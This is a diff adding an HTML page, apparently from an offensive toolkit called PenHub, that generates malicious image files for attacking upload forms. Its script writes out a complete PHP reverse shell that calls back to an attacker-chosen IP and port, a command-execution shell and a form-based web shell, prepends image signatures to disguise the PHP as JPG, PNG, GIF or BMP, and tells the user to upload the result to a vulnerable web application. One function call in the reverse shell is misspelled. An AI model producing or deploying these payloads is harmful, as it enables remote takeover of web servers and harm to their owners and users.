@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Payload Generator - PenHub</title>
+    <link href="https://fonts.cdnfonts.com/css/dubai" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --fg: #e0e0e0;
+            --accent: #b30000;
+            --accent-glow: #ff3333;
+            --panel: #111;
+            --border: #222;
+            --font: "Dubai", "Segoe UI", sans-serif;
+            --size: 1rem;
+            --blue: #1e90ff;
+            --red: #ff4444;
+            --green: #2a9d8f;
+            --yellow: #e9c46a;
+            --purple: #9d4edd;
+            --cyan: #4cc9f0;
+            --orange: #f8961e;
+        }
+        
+        * {
+            box-sizing: border-box;
+            font-family: var(--font);
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background: var(--bg);
+            color: var(--fg);
+            font-size: var(--size);
+            line-height: 1.6;
+            padding: 25px;
+            font-weight: 400;
+            letter-spacing: 0.2px;
+        }
+        
+        .page-title {
+            color: #ffffff;
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--accent);
+            font-size: 2.2rem;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+            font-family: var(--font);
+            font-weight: 600;
+        }
+        
+        .payload-section {
+            background: var(--panel);
+            padding: 25px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            border-left: 4px solid var(--accent);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .payload-section h2 {
+            color: var(--accent-glow);
+            border-bottom: none;
+            margin-bottom: 20px;
+            text-shadow: 0 0 6px rgba(255, 51, 51, 0.2);
+            font-family: var(--font);
+            font-size: 1.3rem;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #f0f0f0;
+            font-size: 0.95rem;
+            font-family: var(--font);
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            background: #151515;
+            color: var(--fg);
+            border: 1px solid var(--border);
+            font-size: 0.95rem;
+            margin-bottom: 15px;
+            border-radius: 6px;
+            transition: all 0.3s ease;
+            font-family: var(--font);
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 2px rgba(255, 51, 51, 0.2);
+        }
+        
+        textarea {
+            resize: vertical;
+            min-height: 60px;
+            line-height: 1.5;
+        }
+        
+        .param-row {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 12px;
+            align-items: center;
+        }
+        
+        .param-row label {
+            margin-bottom: 0;
+            min-width: 140px;
+            font-size: 0.9rem;
+        }
+        
+        .param-row input, .param-row select {
+            margin-bottom: 0;
+            flex: 1;
+        }
+        
+        .file-upload {
+            border: 2px dashed var(--border);
+            padding: 25px;
+            text-align: center;
+            margin: 15px 0;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .file-upload:hover {
+            border-color: var(--accent);
+            background: rgba(179, 0, 0, 0.05);
+        }
+        
+        button {
+            background: var(--accent);
+            color: #fff;
+            border: 0;
+            padding: 10px 18px;
+            cursor: pointer;
+            border-radius: 6px;
+            font-weight: 600;
+            margin: 8px 0;
+            transition: all 0.3s ease;
+            font-family: var(--font);
+            font-size: 0.95rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        
+        button:hover {
+            background: var(--accent-glow);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .download-btn {
+            background: var(--accent);
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            margin-top: 15px;
+            margin-right: 15px;
+            transition: all 0.3s ease;
+            font-family: var(--font);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+        }
+        
+        .download-btn:hover {
+            background: var(--accent-glow);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .payload-output {
+            background: #000;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border: 1px solid var(--border);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .payload-output pre {
+            background: transparent;
+            padding: 0;
+            border-left: none;
+            white-space: pre-wrap;
+            margin: 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+        
+        .blog-post {
+            background: var(--panel);
+            padding: 25px;
+            margin-bottom: 25px;
+            border-radius: 8px;
+            border-left: 4px solid var(--accent);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .blog-post h2 {
+            color: var(--accent-glow);
+            border-bottom: none;
+            margin-bottom: 15px;
+            text-shadow: 0 0 6px rgba(255, 51, 51, 0.2);
+            font-size: 1.6rem;
+            font-family: var(--font);
+        }
+        
+        .blog-post pre {
+            background: #000;
+            padding: 18px;
+            border-left: 4px solid var(--accent);
+            white-space: pre-wrap;
+            margin: 15px 0;
+            border-radius: 0 8px 8px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .blog-post p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+            font-family: var(--font);
+        }
+        
+        .blog-post ul {
+            margin-left: 20px;
+            margin-bottom: 15px;
+        }
+        
+        .blog-post li {
+            margin-bottom: 8px;
+            font-family: var(--font);
+        }
+        
+        @media (max-width: 900px) {
+            .param-row {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .param-row label {
+                min-width: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1 class="page-title">Image Payload Generator</h1>
+    
+    <div class="payload-section">
+        <h2>Create Malicious Image Payload</h2>
+        
+        <label>Payload Type
+            <select id="payloadType">
+                <option value="reverse">Reverse Shell</option>
+                <option value="cmd">Command Execution</option>
+                <option value="web">Web Shell</option>
+                <option value="custom">Custom PHP Code</option>
+            </select>
+        </label>
+        
+        <div id="reverseShellParams">
+            <div class="param-row">
+                <label>Local IP:</label>
+                <input id="payloadLhost" placeholder="10.200.180.200" value="10.200.180.200">
+            </div>
+            <div class="param-row">
+                <label>Local Port:</label>
+                <input id="payloadLport" placeholder="443" value="443">
+            </div>
+        </div>
+        
+        <div id="cmdParams">
+            <div class="param-row">
+                <label>Command:</label>
+                <input id="payloadCmd" placeholder="whoami; id; pwd" value="whoami; id; pwd">
+            </div>
+        </div>
+        
+        <label>PHP Payload Code
+            <textarea id="phpCode" rows="10" placeholder="Enter custom PHP code or use the generated payload based on your selection"></textarea>
+        </label>
+        
+        <div class="param-row">
+            <label>Image Type:</label>
+            <select id="imageType">
+                <option value="jpg">JPG</option>
+                <option value="jpeg">JPEG</option>
+                <option value="png">PNG</option>
+                <option value="gif">GIF</option>
+                <option value="bmp">BMP</option>
+            </select>
+        </div>
+        
+        <div class="param-row">
+            <label>Output Filename:</label>
+            <input id="outputFilename" placeholder="shell" value="shell">
+        </div>
+        
+        <div class="file-upload" id="imageUpload">
+            <p>Click to upload an image file (optional)</p>
+            <input type="file" id="imageFile" accept=".jpg,.jpeg,.png,.gif,.bmp" style="display: none;">
+            <p id="uploadStatus">No file selected</p>
+        </div>
+        
+        <button onclick="generatePayload()">Generate Payload</button>
+        
+        <div class="payload-output" id="payloadOutput" style="display: none;">
+            <h3>Generated Payload</h3>
+            <pre id="payloadCode"></pre>
+            <button class="download-btn" onclick="downloadPayload()">Download Malicious Image</button>
+            <button class="download-btn" onclick="downloadPHP()">Download PHP Payload</button>
+            <p><strong>Usage:</strong> Upload this file to a vulnerable web application that allows image uploads but executes PHP code in image files.</p>
+        </div>
+    </div>
+    
+    <div class="blog-post">
+        <h2>Image Payload Techniques</h2>
+        <p><strong>Method 1: File Extension Bypass</strong></p>
+        <pre>shell.php.jpg
+shell.png.php
+shell.pHp.jpg</pre>
+        
+        <p><strong>Method 2: Magic Bytes Injection</strong></p>
+        <pre>FF D8 FF E0 - JPEG signature
+89 50 4E 47 - PNG signature
+47 49 46 38 - GIF signature</pre>
+        
+        <p><strong>Method 3: Polyglot Files</strong></p>
+        <pre>Files that are valid as both images and PHP scripts</pre>
+        
+        <p><strong>Common Vulnerable Scenarios:</strong></p>
+        <ul>
+            <li>File upload forms with improper validation</li>
+            <li>Applications that check only file extension</li>
+            <li>Server misconfiguration allowing PHP execution in image directories</li>
+            <li>Content-Type spoofing attacks</li>
+        </ul>
+    </div>
+
+    <script>
+        // Payload Generator elements
+        const payloadType = document.getElementById('payloadType');
+        const payloadLhost = document.getElementById('payloadLhost');
+        const payloadLport = document.getElementById('payloadLport');
+        const payloadCmd = document.getElementById('payloadCmd');
+        const phpCode = document.getElementById('phpCode');
+        const imageType = document.getElementById('imageType');
+        const outputFilename = document.getElementById('outputFilename');
+        const imageUpload = document.getElementById('imageUpload');
+        const imageFile = document.getElementById('imageFile');
+        const uploadStatus = document.getElementById('uploadStatus');
+        const payloadOutput = document.getElementById('payloadOutput');
+        const payloadCode = document.getElementById('payloadCode');
+        
+        let uploadedImageData = null;
+        
+        // Minimal image data for different formats
+        const imageSignatures = {
+            jpg: new Uint8Array([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01]),
+            jpeg: new Uint8Array([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01]),
+            png: new Uint8Array([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
+            gif: new Uint8Array([0x47, 0x49, 0x46, 0x38, 0x39, 0x61]),
+            bmp: new Uint8Array([0x42, 0x4D])
+        };
+        
+        // Image upload handling
+        imageUpload.addEventListener('click', () => {
+            imageFile.click();
+        });
+        
+        imageFile.addEventListener('change', (e) => {
+            const file = e.target.files[0];
+            if (file) {
+                uploadStatus.textContent = `Selected: ${file.name}`;
+                
+                const reader = new FileReader();
+                reader.onload = function(event) {
+                    uploadedImageData = event.target.result;
+                };
+                reader.readAsArrayBuffer(file);
+            }
+        });
+        
+        // Update payload parameters based on selection
+        function updatePayloadParameters() {
+            const type = payloadType.value;
+            
+            // Show/hide parameter sections
+            document.getElementById('reverseShellParams').style.display = type === 'reverse' ? 'block' : 'none';
+            document.getElementById('cmdParams').style.display = type === 'cmd' ? 'block' : 'none';
+            
+            // Update PHP code based on selection
+            let code = '';
+            
+            switch(type) {
+                case 'reverse':
+                    code = `<?php
+// PHP Reverse Shell - PenHub
+set_time_limit(0);
+$ip = '${payloadLhost.value || '10.200.180.200'}';
+$port = ${payloadLport.value || '443'};
+
+// Check if we can use /bin/sh
+$shell = '/bin/sh';
+if(!file_exists($shell)) {
+    $shell = 'cmd.exe'; // Windows fallback
+}
+
+// Create socket
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if(!$sock) {
+    exit();
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if(!is_resource($process)) {
+    exit();
+}
+
+// Non-blocking mode
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_setBlocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+// Main loop
+while(1) {
+    // Check for end
+    if(feof($sock) || feof($pipes[1])) {
+        break;
+    }
+    
+    // Read from socket
+    $read = array($sock, $pipes[1], $pipes[2]);
+    $write = NULL;
+    $except = NULL;
+    
+    if(stream_select($read, $write, $except, 0)) {
+        // Socket -> Process
+        if(in_array($sock, $read)) {
+            $input = fread($sock, 1024);
+            fwrite($pipes[0], $input);
+        }
+        
+        // Process -> Socket
+        if(in_array($pipes[1], $read)) {
+            $output = fread($pipes[1], 1024);
+            fwrite($sock, $output);
+        }
+        
+        // Errors -> Socket
+        if(in_array($pipes[2], $read)) {
+            $error = fread($pipes[2], 1024);
+            fwrite($sock, $error);
+        }
+    }
+}
+
+// Cleanup
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+?>`;
+                    break;
+                    
+                case 'cmd':
+                    code = `<?php
+// PHP Command Execution - PenHub
+if(isset($_GET['cmd'])) {
+    header('Content-Type: text/plain');
+    system($_GET['cmd']);
+    exit();
+}
+
+// Default command execution
+$cmd = '${payloadCmd.value || 'whoami; id; pwd'}';
+echo "<pre>" . shell_exec($cmd) . "</pre>";
+?>`;
+                    break;
+                    
+                case 'web':
+                    code = `<?php
+// PHP Web Shell - PenHub
+echo '<html><body><form method="POST">
+<input type="text" name="cmd" style="width:80%" placeholder="Enter command">
+<input type="submit" value="Execute">
+</form><pre>';
+
+if(isset($_POST['cmd'])) {
+    system($_POST['cmd']);
+}
+
+echo '</pre></body></html>';
+?>`;
+                    break;
+                    
+                case 'custom':
+                    // Keep existing custom code
+                    code = phpCode.value;
+                    break;
+            }
+            
+            phpCode.value = code;
+        }
+        
+        // Payload generation
+        function generatePayload() {
+            const code = phpCode.value;
+            const imageExt = imageType.value;
+            const filename = outputFilename.value || 'shell';
+            
+            // Create image signatures based on file type
+            let signature = '';
+            switch(imageExt) {
+                case 'jpg':
+                case 'jpeg':
+                    signature = 'FFD8FF'; // JPEG signature
+                    break;
+                case 'png':
+                    signature = '89504E47'; // PNG signature
+                    break;
+                case 'gif':
+                    signature = '47494638'; // GIF signature
+                    break;
+                case 'bmp':
+                    signature = '424D'; // BMP signature
+                    break;
+            }
+            
+            // Display the generated payload code
+            payloadCode.textContent = `<?php
+// PenHub Image Payload
+// File: ${filename}.${imageExt}
+// Signature: ${signature}
+
+${code}
+
+// Image data placeholder
+// Actual image data would be prepended to this file
+?>`;
+            
+            payloadOutput.style.display = 'block';
+        }
+        
+        function downloadPayload() {
+            const code = phpCode.value;
+            const imageExt = imageType.value;
+            const filename = outputFilename.value || 'shell';
+            
+            // Create the malicious image file
+            const encoder = new TextEncoder();
+            const phpBytes = encoder.encode(code);
+            
+            // Get image signature for the selected format
+            const imageSignature = imageSignatures[imageExt];
+            
+            // Create the malicious file (image signature + PHP code)
+            const combinedBytes = new Uint8Array(imageSignature.length + phpBytes.length);
+            combinedBytes.set(imageSignature);
+            combinedBytes.set(phpBytes, imageSignature.length);
+            
+            // Create blob and download
+            const blob = new Blob([combinedBytes], {type: 'application/octet-stream'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${filename}.${imageExt}`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        function downloadPHP() {
+            const code = phpCode.value;
+            const filename = outputFilename.value || 'shell';
+            
+            // Create blob and download as PHP file
+            const blob = new Blob([code], {type: 'application/x-httpd-php'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `${filename}.php`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        // Payload type change listener
+        payloadType.addEventListener('change', updatePayloadParameters);
+        
+        // Initialize
+        updatePayloadParameters();
+        
+        // Add event listeners for inputs
+        payloadLhost.addEventListener('input', updatePayloadParameters);
+        payloadLport.addEventListener('input', updatePayloadParameters);
+        payloadCmd.addEventListener('input', updatePayloadParameters);
+        phpCode.addEventListener('input', updatePayloadParameters);
+    </script>
+</body>
+</html>
